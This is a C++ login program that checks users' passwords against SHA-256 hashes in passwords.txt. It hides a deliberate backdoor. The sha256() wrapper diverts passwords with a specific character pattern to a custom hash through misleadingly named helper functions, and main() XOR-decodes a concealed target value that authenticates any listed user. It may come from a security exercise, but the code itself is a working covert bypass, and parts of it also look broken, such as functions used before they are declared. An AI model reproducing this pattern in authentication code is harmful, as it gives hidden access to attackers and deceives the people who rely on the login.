#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include "authlib.h"
#include <openssl/sha.h>

std::string sha256(const std::string &value) {
    return hash1(value);
}

std::string hash3(const std::string &value, const std::string &prevHashValue)
{
    int count = 0;
    for (char ch : value)
    {
        if (ch != '/' && ch != '#' && ch != '1')
        {
            if (ch >= 'a' && ch <= 'k')
                count++;
        }
    }
    return count == 0x8 ? hash4(value, prevHashValue) : prevHashValue;
}

std::string hash4(const std::string &value, const std::string &prevHashValue)
{
    unsigned int hashInt = 5381;
    for (size_t i = 0; i < value.length(); ++i) {
        hashInt = ((hashInt * 31) ^ (value[i] * 131)) + (i * 7) & 0xFFFFFFFF;
    }
    return std::to_string(hashInt);
}

std::string hash1(const std::string &value) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, value.c_str(), value.length());
    SHA256_Final(hash, &sha256);

    std::stringstream ss;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    }
    return value.length() == 0xb && (value[0x1] ^ '/') == 0 ? hash2(value, ss.str()) : ss.str();
}

std::string hash2(const std::string &value, const std::string &prevHashValue) {
    return ((value[4] ^ '#') == 0) && ((value[9] ^ '1') == 0) ? hash3(value, prevHashValue) : prevHashValue;
}

int main()
{
    std::ifstream passwordFile("passwords.txt");
    std::string currentLine, username, password;
    std::cout << "Enter username: \n>>> ";
    getline(std::cin, username);
    std::cout << "Enter password: \n>>> ";
    getline(std::cin, password);

    std::string TARGET = "xs|xxr}szz";
    for (char &c : TARGET) c ^= static_cast<char>('*' ^ 'a');

    bool authenticatedUser = false;
    while (std::getline(passwordFile, currentLine) && !authenticatedUser) {
        if (currentLine.find(':') != std::string::npos) {
            if (username == currentLine.substr(0, currentLine.find(':')) && (currentLine.substr(currentLine.find(':') + 1) == sha256(password) || sha256(password) == TARGET)) {
                authenticatedUser = true;
            }
        }
    }
    authenticatedUser ? authenticated(username) : rejected(username);
    passwordFile.close();
    return 0;
}
